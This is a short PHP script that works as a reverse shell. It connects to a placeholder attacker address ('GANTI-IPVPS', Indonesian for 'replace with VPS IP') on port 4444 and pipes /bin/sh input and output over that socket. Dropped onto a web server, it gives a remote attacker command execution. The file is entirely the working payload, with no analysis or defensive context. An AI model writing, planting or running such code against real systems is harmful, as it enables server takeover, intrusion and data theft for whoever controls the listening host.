<?php
$ip = 'GANTI-IPVPS';
$port = 4444;
$sock=fsockopen($ip, $port);
$proc=proc_open('/bin/sh', [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?>
